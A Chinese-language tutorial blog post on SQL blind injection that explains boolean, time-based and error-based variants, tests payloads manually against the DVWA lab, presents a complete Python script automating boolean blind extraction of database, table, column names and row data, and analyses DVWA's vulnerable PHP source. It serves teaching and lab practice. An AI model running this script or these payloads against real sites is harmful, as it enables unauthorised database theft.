***郑重声明：本文展示的攻击过程是在模拟环境中进行的。文中涉及的漏洞原理和攻击方法，只为交流学习之用。如有人用于非法用途，产生的后果笔者不负任何责任。**

 **最近在学习SQL盲注，自己整理了一下SQL盲注的基础知识，然后记录了一个简单的实战，请大家多多指点。**

##  **一、SQL盲注基础知识**

###  1.什么是盲注

用户发起请求（并不一定是查询），服务器收到请求后在数据库进行相应操作，并根据返回结果执行后续流程。在这个过程中，服务器并不会将查询结果返回到页面进行显示，这就是盲注。典型场景为在用户注册功能中，只提示用户名是否被注册，但并不会返回数据。

###  2.盲注的分类

盲注大致分为三类：布尔型盲注、时间型盲注、报错型盲注。

>
> 布尔型盲注：布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。页面在执行sql语句后，只会显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。
>
>
> 时间型盲注：时间盲注指通过页面执行的时间来判断数据内容的注入方式，通常用于数据（包含逻辑型）不能返回到页面中的场景，无法利用页面回显判断数据内容，只能通过执行的时间来获取数据。
>
>
> 报错型盲注：构造SQL语句，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果；当然其他类型的数据库也存在相应的问题。

###  3.盲注的大致流程

判断是否存在注入，注入的类型-- >猜解当前数据库名称-- >猜解数据库中的表名-- >猜解表中的字段名-- >获取表中的字段值-->验证字段值的有效性-- >获取数据库的其他信息：版本、用户等。

###  4.相关函数

> sleep():在时间型盲注中需要用到，可以将程序挂起一段时间
>
> Length():返回一个字符串的长度
>
> Substr()、substring()、mid():截取字符串
>
> Ascii():返回字符的ascii码
>
> If(expr1,expr2,expr3):如果expr1正确就执行expr2，否则执行expr3
>
> Database():返回当前数据库的名称
>
> extractvalue()、updatexml():用于报错注入

##  **二、SQL盲注实战**

现在利用DVWA平台中的SQL Injection (Blind)模块来进行基于布尔型的盲注实战（low级别）。

###  1.手工测试是否具有注入点

payload:1’，显示“MISSING”

![1593235258_5ef6d73a7b3fd.png!small](https://image.3001.net/images/20200627/1593235258_5ef6d73a7b3fd.png!small)

payload:1’ # ，显示“exists”,初步判断此处具有SQL注入漏洞，且为字符型的注入漏洞。

![1593235272_5ef6d7487c2e8.png!small](https://image.3001.net/images/20200627/1593235272_5ef6d7487c2e8.png!small)

payload:1’ and 1=1 # , 显示“exists”

![1593235278_5ef6d74ec7d8f.png!small](https://image.3001.net/images/20200627/1593235278_5ef6d74ec7d8f.png!small)

payload:1’ and 1=2 #，显示“MISSING”

![1593235283_5ef6d753a11ec.png!small](https://image.3001.net/images/20200627/1593235283_5ef6d753a11ec.png!small)由上可见，此处SQL注入漏洞实锤了。

###  2.漏洞利用

由于手工来进行盲注工作量非常大，因此下面贴上python代码来进行自动化注入。

    
    
    # coding=utf-8
    import requests,re
    
    # 执行请求
    def exec_request(sql):
        id = f'?id={sql}&Submit=Submit#'
        # print("Payload:",url+id)
        r = requests.get(url + id, headers=headers).text
        # print(r)
        try:
            if 'exists' in re.search('User ID.*?database', r).group():
                return 1
            else:
                return 0
        except:
            return 0
    
    # 判断是否存在注入点
    def judge_injection():
        print('<-- 判断该网页是否存在注入点-->')
        if exec_request("1' and '1'='1") != exec_request("1' and '1'='2"):
            print('Result:此处存在注入点,并且注入类型为字符型！')
        elif exec_request("1 and 1=1") != exec_request("1 and 1=2"):
            print('Result:此处存在注入点,并且注入类型为数字型！')
        else:
            print('不存在注入,退出！')
            quit()
        print('\n' * 2)
    
    # 判断数据库名的长度
    def judge_databaseName_len():
        print('<-- 判断数据库名长度-->')
        databaseName_len = 0
        for i in range(100):
            sql = f"1%27+and+length(database())%3D{i}%23"
            if(exec_request(sql)==1):
                print(f"Result:该数据库名的长度为:{i}！")
                databaseName_len = i
                break
        print('\n' * 2)
        return databaseName_len
    
    # 爆破数据库名字
    def get_databaseName(databaseName_len):
        print('<-- 爆破数据库名字-->')
        database_name = ''
        for i in range(databaseName_len):
            # ASCII码可显字符十进制为32到126
            for j in range(32, 127):
                sql = f"1'+and+ascii(substr(database()%2C{i + 1}%2C1))%3D{j}%23"
                if exec_request(sql) == 1:
                    database_name += chr(j)
                    break
        print(f'Result:数据库名称为:{database_name}！')
        print('\n' * 2)
        return database_name
    
    # 判断该数据库中有几张表
    def judge_table_num(database_name):
        print(f'<-- 判断{database_name}数据库中有几张表-->')
        for i in range(9999):
            sql = f"1'+and+(select+count(table_name)+from+information_schema.tables+where+table_schema%3D'{database_name}')%3D{i}%23"
            if exec_request(sql) == 1:
                print(f'Result:{database_name}数据库中有{i}张表！')
                table_num = i
                break
        print('\n' * 2)
        return table_num
    
    # 判断数据库中各个表名的长度
    def judge_tablesName_len(table_num):
        print(f'<-- 判断{database_name}数据库中各个表名的长度-->')
        tablesName_len_list = []
        for i in range(table_num):
            for j in range(99):
                # 1' and length(substr((select table_name from information_schema.tables where table_schema=[database_name] limit 0,1),1))=9#
                # substr(str,1)表示截取字符串str第一个最后的所有字符串（包括第一个）
                sql = f"1'+and+length(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{database_name}'+limit+{i}%2C1)%2C1))%3D{j}%23"
                if exec_request(sql)==1:
                    tablesName_len_list.append(j)
        print(f"Result:{table_num}张表的表名长度分别为：",end='')
        for i in range(len(tablesName_len_list)):
            print(tablesName_len_list[i],end='\t')
        print('\n' * 2)
        return tablesName_len_list
    
    # 爆破该数据库中各表的表名
    def get_tables_name(tablesName_len_list):
        print(f'<-- 爆破{database_name}数据库中各表的表名-->')
        table_name = ''
        table_name_list = []
        for i in range(len(tablesName_len_list)):
            for j in range(tablesName_len_list[i]):
                for g in range(32,127):
                    # payload:1' and ascii(substr((select table_name from information_schema where table_shema = 'dvwa' limit 0,1),1,1))=97#
                    sql = f"1'+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3D'{database_name}'+limit+{i}%2C1)%2C{j + 1},1))={g}%23"
                    if(exec_request(sql)==1):
                        table_name += chr(g)
                        print(chr(g), end='')
                        break
            table_name_list.append(table_name)
            table_name = ''
            print('')
        print(f'Result:{database_name}数据库中的表名为:', end='')
        list(map(lambda i: print(i, end='  '), [i for i in table_name_list]))
        print('\n' * 2)
        return table_name_list
    
    # 获取表的字段名
    def get_fieldName(table_name_list):
        print('<--爆破选定表的字段名-->')
        # 1.list()方法：将元组转化成列表
        # 2.enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标。[(x, y) for x, y in enumerate(table_name_list)] ==>[(0, 'users'), (1, 'guestbook')]
        # 3.map(function, iterable, ...)函数：根据提供的函数对指定序列做映射
        # 4.匿名函数lambda用法---变量 : 要执行的语句。变量可以是一个或多个，变量就是数据对象的元素
        list(map(lambda x: print(f'{x[0]}:{x[1]}'), [(x, y) for x, y in enumerate(table_name_list)]))
        # 根据序号来对应获取列表中的值（表名）
        global table_name  # 定义全局变量，方便get_data（）使用
        table_name = [x for x in table_name_list][int(input('请选择查看哪个表的字段名（输入数字）：'))]
        for i in range(9999):
            sql = f"1'+and+(select+count(column_name)+from+information_schema.columns+where+table_name%3D'{table_name}')%3D{i}%23"
            if exec_request(sql) == 1:
                print(f'Result:该表中有{i}列\n\n')
                lie_num = i
                break
    
        print('<--猜解每一列的长度-->')
        lie_lenth = []
        for i in range(lie_num):
            for j in range(9999):
                # 1' and length(substr((select column_name from information_schema.columns where table_name=[table_name] limit 0,1),1))=1#
                sql = f"1'+and+length(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{table_name}'+limit+{i}%2C1)%2C1))%3D{j}%23"
                if exec_request(sql) == 1:
                    lie_lenth.append(j)
                    break
        # print(lie_lenth)
        print(f'Result:{table_name}表中每个字段名的长度为:', end='')
        list(map(lambda i: print(i, end=' '), [i for i in lie_lenth]))
        print('\n' * 2)
    
        print('<--猜解每个字段的名称-->')
        fieldName = ''
        fieldName_list = []
        for i in range(len(lie_lenth)):
            for j in range(lie_lenth[i]):
                for g in range(65, 123):
                    # 1' and ascii(substr((select column_name from information_schema.columns where table_name=[table_name] limit 0,1),1))=97#
                    sql = f"1'+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D'{table_name}'+limit+{i}%2C1)%2C{j + 1}))%3D{g}%23"
                    if exec_request(sql) == 1:
                        fieldName += chr(g)
                        print(chr(g), end='')
                        break
            print('')
            fieldName_list.append(fieldName)
            fieldName = ''
        print(f'Result:{table_name}表的各个字段为:', end='')
        # print(fieldName_list)
        list(map(lambda i: print(i, end='  '), [i for i in fieldName_list]))
        print('\n' * 2)
        return fieldName_list
    
    # 获取数据
    def get_data(fieldName_list):
        print('<--获取数据-->')
        data = {}
    
        for xxx in range(999):
            a = input('hint:需进一步获取数据请按回车键，退出请按q：')
            if a == 'q':
                break
            else:
                list(map(lambda x: print(f'{x[0]}:{x[1]}'), [(x, y) for x, y in enumerate(fieldName_list)]))
                lie_name = [x for x in fieldName_list][int(input('hint:请选择查看哪个字段的数据：'))]
                res = ''
                huancun = []
                for i in range(9999):
                    for j in range(1, 9999):
                        for g in range(128):
                            NULL = 0
                            ascii_wu = 0
                            # 1' and (ascii(substr((select [lie_name] from [table_name] limit 0,1),1,1)))=97#
                            sql = f"1'+and+(ascii(substr((select+{lie_name}+from+{table_name}+limit+{i}%2C1)%2C{j}%2C1)))%3D{g}%23"
                            if exec_request(sql) == 1:
                                if g == 0:
                                    NULL = 1
                                    if res == '':
                                        res == 'NULL'
                                    break
                                res += chr(g)
                                print(chr(g), end='')
                                break
                        else:
                            ascii_wu = 1
                        if NULL == 1 or ascii_wu == 1:
                            break
                    if ascii_wu == 1:
                        break
                    huancun.append(res)
                    res = ''
                    print()
                data[lie_name] = huancun
    
        for i in data.keys():
            print(f'\t{i}\t', end='')
        print()
        data_list = list(data.values())
        for i in range(len((data_list)[0])):
            for j in range(len(data_list)):
                print(f'\t{data_list[j][i]}\t', end='')
            print()
    
    if __name__ == '__main__':
        headers = {
            'Host': 'www.dvwa.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
            'Accept': 'text/css,*/*;q=0.1',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cookie': 'PHPSESSID=ih0n1qcl3lqojg2v8l60k3jrd6; security=low'
        }
        url = 'http://www.dvwa.com/vulnerabilities/sqli_blind/'
    
        # 注入点判断
        judge_injection()
    
        # 判断数据库长度
        databaseName_len = judge_databaseName_len()
    
        # 爆破数据库名字
        database_name = get_databaseName(databaseName_len)
    
        # 判断该数据库中有几张表
        table_num = judge_table_num(database_name)
    
        # 判断该数据库中各个表名的长度
        tablesName_len_list = judge_tablesName_len(table_num)
    
        # 爆破该数据库中各表的表名
        table_name_list = get_tables_name(tablesName_len_list)
    
        # 获得指定表的字段名,返回字段名列表
        fieldName_list = get_fieldName(table_name_list)
    
        # 获取数据
        get_data(fieldName_list)

> ps：1.请求头headers可进行自己的具体内容进行更改。
>
> 2.上述python代码基于python3环境运行
>
> 3.代码下载链接：<https://pan.baidu.com/s/1mXtlNL-qMQ7BiCbQC_cdMg> 提取码：tbo7

代码运行效果如下：

![1593328823_5ef844b7282d0.png!small](https://image.3001.net/images/20200628/1593328823_5ef844b7282d0.png!small)

## **三、源码分析**

这里贴上一个DVWA的SQL Injection (Blind)模块low级别的源码。

    
    
    <?php 
    if( isset( $_GET[ 'Submit' ] ) ) { 
        // Get input 
        $id = $_GET[ 'id' ]; 
    
        // Check database 
        $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors 
    
        // Get results 
        $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors 
        if( $num > 0 ) { 
            // Feedback for end user 
            echo '<pre>User ID exists in the database.</pre>'; 
        } 
        else { 
            // User wasn't found, so the page wasn't! 
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 
    
            // Feedback for end user 
            echo '<pre>User ID is MISSING from the database.</pre>'; 
        } 
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res); 
    } 
    ?>

由上述源码可见，服务器端没有对客户端传过来的参数id进行任何的检查，也没有进行任何的敏感字符过滤，而是直接将参数id拼接在了SQL语句的后面，因此就造成了SQL注入漏洞，并且这里是一个字符型的SQL注入漏洞。根据代码来看，从数据库查询出来的数据并没有直接显示在前端用户的页面上，而是通过返回的查询结果数目来判断用户是否存在，如果用户存在，则显示“User
ID exists in the database.”，如果用户不存在，则显示“User ID is MISSING from the
database.”，通过这两种情况的不同回显结果，因此也就可以判断出这是一个典型的基于布尔型的SQL盲注漏洞。

